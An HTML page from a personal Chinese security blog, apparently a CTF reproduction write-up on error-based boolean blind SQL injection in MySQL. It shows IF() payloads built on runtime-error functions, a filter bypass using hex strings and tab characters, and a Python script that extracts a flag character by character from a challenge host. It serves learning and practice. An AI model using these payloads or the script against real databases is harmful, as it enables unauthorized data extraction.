@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="qrl-0">
+    
+    
+    
+    
+    
+    
+    <title>复现-我TMD烦死了 | 七里燃</title>
+    <!-- inject:style -->
+    <link href="/myblog/css/style.css" rel="stylesheet" type="text/css">
+    <!-- endinject -->
+    <style>
+        .cube-loading {
+            top: 0;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: url('/myblog/images/lg/loading.gif') no-repeat center center;
+            background-color: rgba(0,0,0,.7);
+        }
+
+        .cube-loading.out {
+            display: none;
+        }
+
+        .cube-loading:before {
+            display: block;
+            content: '加载中';
+            position: relative;
+            width: 100%;
+            top: 50%;
+            right: -50%;
+            color: #fff;
+        }
+
+        @media(max-width: 768px) {
+            .cube-loading:before {
+                font-size: 1.2em;
+                transform: translate(-24px,20px);
+                -webkit-transform: translate(-24px,20px);
+                -o-transform: translate(-24px,20px);
+                -ms-transform: translate(-24px,20px);
+            }
+        }
+
+        @media(min-width: 768px) {
+            .cube-loading:before {
+
+            }
+        }
+    </style>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+<div class="cube-body">
+    <nav id="cube-top-memu" class="cube-menu">
+    <ul class="cube-menu-collapse">
+        
+        <li>
+            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
+            <a href="/myblog/">首页</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
+            <a href="/myblog/archives">归档</a>
+        </li>
+        
+    </ul>
+</nav>
+<nav class="cube-side-menu" id="cube-side-menu">
+    <ul class="cube-menu-list">
+        
+        <li>
+            <a class="lrc-control">开启歌词</a>
+        </li>
+        
+        <li>
+            <a class="scroll-to-top">回到顶部</a>
+        </li>
+    </ul>
+</nav>
+    <header class="cube-header" id="cube-header">
+    <img src=" https://qlr-0.gitee.io/hhhh/background.jpg " alt="头部背景图片">
+    
+    <div class="cube-type">
+        <span class="cube-typed-title">七里燃の部落格</span>
+        <span class="cube-typed-cursor">|</span>
+    </div>
+    
+</header>
+
+    <style>
+        nav.cube-menu:before {
+            content: '';
+            visibility: hidden;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 44px;
+        
+            filter: blur(5px);
+            -webkit-filter: blur(5px);
+        
+            z-index: -1;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-repeat: no-repeat;
+            background-position: center -356px;
+            background-size: cover;
+            background-color: transparent;
+        }
+
+        header.cube-background.cube-header-background {
+            visibility: hidden;
+            background-image: url('https://qlr-0.gitee.io/hhhh/background.jpg');
+            background-position: center -400px;
+        }
+    </style>
+    <header class="cube-background cube-header-background">
+        
+        <div class="cube-type">
+            <span class="cube-typed-title">七里燃の部落格</span>
+            <span class="cube-typed-cursor">|</span>
+        </div>
+        
+    </header>
+    <div class="load-header-background"></div>
+    <script>
+        (function (window) {
+
+            window.headerModule = {}
+            window.headerModule.image = {
+                width: '2000',
+                height: '1414'
+            }
+
+        })(window)
+    </script>
+    
+    <div class="cube-content">
+        <div class="cube-left">
+            <div class="cube-article">
+    <h1 class="title">复现-我TMD烦死了</h1>
+    
+    <div class="cube-article-header">
+        <div class="cube-article-date">
+            <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+            <!-- moment.js对象 -->
+            2021-03-28
+        </div>
+        <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+    <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+    
+</div>
+    </div>
+    
+    <div class="cube-article-content cube-markdown">
+        
+        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_17-06-28.png"><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_17-06-28.png" alt="Snipaste_2021-01-31_17-06-28"></a></p>
+<p>当输入有被过滤的字符时</p>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_17-10-35.png"><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_17-10-35.png" alt="Snipaste_2021-01-31_17-10-35"></a></p>
+<p>到这里我没有半点头绪。。。。</p>
+<p>看了writeup，才知道可以用⼀些能够通过MYSQL解释器的预检查却在运⾏时候出现错误的SQL函数来进行盲注。</p>
+<h3 id="涉及到的函数"><a href="#涉及到的函数" class="headerlink" title="涉及到的函数"></a>涉及到的函数</h3><h4 id="ST-GeomCollFromTxt"><a href="#ST-GeomCollFromTxt" class="headerlink" title="ST_GeomCollFromTxt"></a>ST_GeomCollFromTxt</h4><p>ST_GeomCollFromTxt函数将几何图形集合的知名文本表示形式以及可选的空间参考系统标识符作为输入参数，并返回相应的几何图形集合。ST_GeomFromText 针对的是 POINT() 函 数。</p>
+<h4 id="ST-GeomFromText"><a href="#ST-GeomFromText" class="headerlink" title="ST_GeomFromText"></a>ST_GeomFromText</h4><p>ST_GeomFromText函数将几何图形的熟知文本表示形式以及可选的空间参考系统标识符作为输入参数，并返回相应的几何图形。 ST_MPointFromText 针对的是 MULTIPOINT() 函数。</p>
+<ul>
+<li>MULTIPOINT()，POINT()传⼊的必须是GIS中的地理坐标的数据类型。但是传⼊的是⼀个常量或者undefined类型，它也能正常运⾏。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#if失效</span><br><span class="line">mysql&gt;  SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(aaaaaa)&#39;)), 0);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(&#39;POINT(aaaaaa)&#39;)), 0) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">|                                                0 |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT IF(0, ST_MPointFromText(&#39;MULTIPOINT (aaaaaa)&#39;),0);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| IF(0, ST_MPointFromText(&#39;MULTIPOINT (aaaaaa)&#39;),0)  |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| 0x30                                               |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#if生效</span><br><span class="line">mysql&gt;  SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(aaaaaa)&#39;)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_geomfromtext.</span><br><span class="line">mysql&gt; SELECT IF(1, ST_MPointFromText(&#39;MULTIPOINT (aaaaaa)&#39;),0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_mpointfromtext.</span><br></pre></td></tr></table></figure>
+
+<h4 id="IF-expr1-expr2-expr3"><a href="#IF-expr1-expr2-expr3" class="headerlink" title="IF(expr1,expr2,expr3)"></a>IF(expr1,expr2,expr3)</h4><p>若exp1为ture将会执行expr2否则执行expr3</p>
+<p>这边我们用mysql运行看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#原表</span><br><span class="line">mysql&gt; select runoob_title,runoob_author from runoob_tbl;</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| runoob_title | runoob_author |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| 学习 PHP     | 菜鸟教程      |</span><br><span class="line">| 学习 MySQL   | 菜鸟教程      |</span><br><span class="line">| JAVA 教程    | RUNOOB.COM    |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#替换后的表</span><br><span class="line">mysql&gt; select runoob_title,if(runoob_author&#x3D;&#39;菜鸟教程&#39;,&#39;菜鸟&#39;,&#39;RUNOOB&#39;)as runoob_author from runoob_tbl;</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| runoob_title | runoob_author |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| 学习 PHP     | 菜鸟          |</span><br><span class="line">| 学习 MySQL   | 菜鸟          |</span><br><span class="line">| JAVA 教程    | RUNOOB        |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>但是再次查询表，列<code>runoob_author</code>并不没有发生改变</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select runoob_title,runoob_author from runoob_tbl;</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| runoob_title | runoob_author |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">| 学习 PHP     | 菜鸟教程      |</span><br><span class="line">| 学习 MySQL   | 菜鸟教程      |</span><br><span class="line">| JAVA 教程    | RUNOOB.COM    |</span><br><span class="line">+--------------+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>说明<code>if()</code>的运行并不会影响数据库中表的信息。</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#可用的函数payload：</span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(&#39;POINT(aaaaaa)&#39;)), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MULTIPOINT (aaaaaa)&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(aaaaaa), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;aaaaaa&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_GeomFromText(&#39;aaaaaa&#39;),0);</span><br></pre></td></tr></table></figure>
+
+<p>题目过滤了很多东西，其中包括单双引号<code>&#39;</code>、<code>&quot;</code>，我们可以⽤⼗六进制来代替字符串，空格我们可以用<code>\t</code>即<code>%09</code>代替。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?cat&#x3D;1%09and%09if%09(0,ST_MPointFromText(0x4d554c5449504f494e54202861616161616129),0)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>if失效</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-37-14.png"><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-37-14.png" alt="Snipaste_2021-01-31_19-37-14"></a></p>
+<ul>
+<li>if生效</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-38-03.png"><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-38-03.png" alt="Snipaste_2021-01-31_19-38-03"></a></p>
+<p>然后用python写脚本跑一下，脚本不会写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#author：Gqleung</span><br><span class="line">#Email:  admin@plasf.cn</span><br><span class="line">#blog:   http:&#x2F;&#x2F;www.plasf.cn</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def ord2hex(string):</span><br><span class="line">	result &#x3D; &quot;&quot;</span><br><span class="line">	for i in string:</span><br><span class="line">		r &#x3D; hex(ord(i));</span><br><span class="line">		r &#x3D; r.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">		result &#x3D; result+r</span><br><span class="line">	return &#39;0x&#39;+result</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28076&#x2F;index.php?cat&#x3D;&quot;</span><br><span class="line">tables &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#39;</span><br><span class="line">result&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,70):</span><br><span class="line">	for j in tables:</span><br><span class="line">		if j &#x3D;&#x3D;&quot;&#123;&quot; or j&#x3D;&#x3D;&quot;&#125;&quot;:</span><br><span class="line">			j&#x3D;&#39;\\&#39;+j</span><br><span class="line">		payload &#x3D; &quot;1	and	IF((select	flag	from	flag)	regexp	binary	%s,	ST_MPointFromText(0x4d554c5449504f494e54202861616161616129),	0)&quot;%(ord2hex(&quot;^&quot;+result+j))</span><br><span class="line">		r &#x3D; requests.get(url+payload);</span><br><span class="line">		if &#39;cat&#39; not in r.text:</span><br><span class="line">			result&#x3D;result+j</span><br><span class="line">			print(result.replace(&#39;\\&#39;,&#39;&#39;))</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-45-42.png"><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B41%E6%9C%8831%E6%97%A5/Snipaste_2021-01-31_19-45-42.png" alt="Snipaste_2021-01-31_19-45-42"></a></p>
+<h2 id="puls"><a href="#puls" class="headerlink" title="puls"></a>puls</h2><p>这是前一题的加强版，前面的方法不能用了，不过在这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4914">通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注</a>里面还提到一些其他可用的函数exp()、pow()、cot()。</p>
+<blockquote>
+<p>pow() - 参数在大于709的情况下会导致sql语句执行失败</p>
+<p>exp()、cot() -  只要能得到超大数导致超过mysql的数值表示返回的，sql语句就会执行失败</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select pow(2,1024);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;</span><br><span class="line">mysql&gt; select exp(99999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(99999)&#39;</span><br><span class="line">mysql&gt; select cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?cat&#x3D;1%09and%09if%09(0,pow(2,1024),0)</span><br><span class="line">index.php?cat&#x3D;1%09and%09if%09(0,exp(99999),0)</span><br><span class="line">index.php?cat&#x3D;1%09and%09if%09(0,cot(0),0)</span><br></pre></td></tr></table></figure>
+
+<p>将上面脚本里的payload修改一下，跑一下就可以得到flag。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4914">通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yoyo2tong.xyz/2021/01/30/cat/">无判断字符,无报错的bool盲注</a></p>
+
+    </div>
+</div>
+
+<div class="cube-article-nav">
+    <ul>
+        
+        <li class="prev">
+            <a href="/myblog/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/">
+                <i class="cube-icon cube-prev" aria-hidden="true"></i>
+                php反序列化练习
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/myblog/2021/03/28/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">
+                弱类型比较
+                <i class="cube-icon cube-next" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+<!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+
+
+        </div>
+        <div class="cube-right">
+            
+
+<div class="cube-search cube-sidebar" id="cube-search">
+    <div class="search-container">
+        <input type="text" placeholder="搜索" class="cube-search-input" id="cube-search-input">
+        <i class="cube-icon cube-icon-search cube-search-submit" aria-hidden="true"></i>
+    </div>
+    <!-- TODO 通过给window赋一个全局变量，通过脚本赋值 -->
+</div>
+<script>
+    (function (window) {
+        'use strict';
+        window.searchModule = {}
+        window.searchModule.JSONUrl = '/myblog/content.json'
+        window.searchModule.rootUrl = '/myblog/'
+    })(window)
+</script>
+<div class="cube-search-form">
+    <div class="cube-search-control">
+        <input type="text" placeholder="搜索" class="search-input">
+        <a class="close-button">
+            <i class="cube-icon cube-close" aria-hidden="true"></i>
+        </a>
+    </div>
+    <div class="cube-search-result"></div>
+</div>
+
+
+<div class="cube-author cube-sidebar" id="cube-author">
+    
+    
+    <span>qrl-0</span>
+    
+    
+    <div class="count">
+        <a class="count articles"><span>11</span>文章</a>
+        <a class="count tags"><span>1</span>标签</a>
+        <a class="count categories"><span>2</span>分类</a>
+    </div>
+</div>
+
+
+
+<div class="cube-music cube-sidebar" id="cube-music">
+    <div class="cube-player aplayer" id="cube-player"></div>
+</div>
+<script>
+    (function (window) {
+        window.musicModule = {}
+        window.musicModule.musicConfig = '{"narrow":false,"autoplay":false,"showlrc":3,"theme":"#b7daff","mutex":true,"mode":"circulation","preload":"auto","listmaxheight":"513px","music":[{"title":"Dear friends","author":"TRIPLANE","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/TRIPLANE - Dear friends.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Dear friends - TRIPLANE.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/TRIPLANE - Dear friends.jpg"},{"title":"Butter-Fly","author":"和田光司","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/和田光司 - Butter-Fly (ピアノヴァージョン).mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/Butter-Fly (ピアノヴァージョン) - 和田光司.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/和田光司 - Butter-Fly (ピアノヴァージョン).jpg"},{"title":"宵闇花火","author":"葉月ゆら","url":"http://cube-1252774894.cosgz.myqcloud.com/music/source/葉月ゆら - 宵闇花火.mp3","lrc":"http://cube-1252774894.cosgz.myqcloud.com/music/lrc/宵闇花火 - 葉月ゆら.lrc","pic":"http://cube-1252774894.cosgz.myqcloud.com/music/image/葉月ゆら - 宵闇花火.jpg"}]}'
+        window.musicModule.lrcConfig = {
+            open: '开启歌词',
+            close: '关闭歌词'
+        }
+    })(window)
+</script>
+
+
+
+<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
+    <div class="title">
+        <a>近期文章</a>
+    </div>
+    <ul class="list">
+        
+        
+        <li>
+            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
+            
+            <div class="normal">
+                <p class="index first">
+                    <span>1</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/gitee+Hexo%20%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="gitee+Hexo 搭建简单的个人博客">gitee+Hexo 搭建简单的个人博客</a>
+                </p>
+            </div>
+            
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>2</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>3</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/ctf-Crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="ctf-Crypto常见加解密">ctf-Crypto常见加解密</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>4</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习">php反序列化练习</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>5</span>
+                </p>
+                <p class="title">
+                    <a href="/myblog/2021/03/28/%E5%A4%8D%E7%8E%B0-%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86/" title="复现-我TMD烦死了">复现-我TMD烦死了</a>
+                </p>
+            </div>
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-categories cube-sidebar" id="cube-categories">
+    <div class="title">
+        <a href="/myblog/categories">分类</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/categories/%E7%BB%83%E4%B9%A0/">#练习</a>
+        </div>
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/categories/blog/">#blog</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-tagcloud cube-sidebar" id="cube-tagcloud">
+    <div class="title">
+        <a href="/myblog/tags">标签云</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box ">
+            <a href="/myblog/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">#知识点</a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="cube-links cube-sidebar" id="cube-links">
+    <div class="title">
+        <a>个人链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            
+            <a href="CHYbeta/Web-Security-Learning" target="_blank">学习</a>
+        </li>
+        
+    </ul>
+</div>
+
+
+
+<div class="cube-friend-links cube-sidebar" id="cube-friend-links">
+    <div class="title">
+        <a>友情链接</a>
+    </div>
+    <ul class="list">
+        
+        <li>
+            <!-- TODO change avatar.png to friend.png-->
+            <img src="/myblog/images/friend_links.jpg ">
+            <a href="" target="_blank"></a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+    </div>
+</div>
+<footer class="cube-footer">
+    
+© 2017 qrl-0
+
+<br>
+Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+</footer>
+<!-- inject:script -->
+<script src="/myblog/js/script.js"></script>
+<!-- endinject -->
+<div class="cube-loading out"></div>
+</body>
+</html>
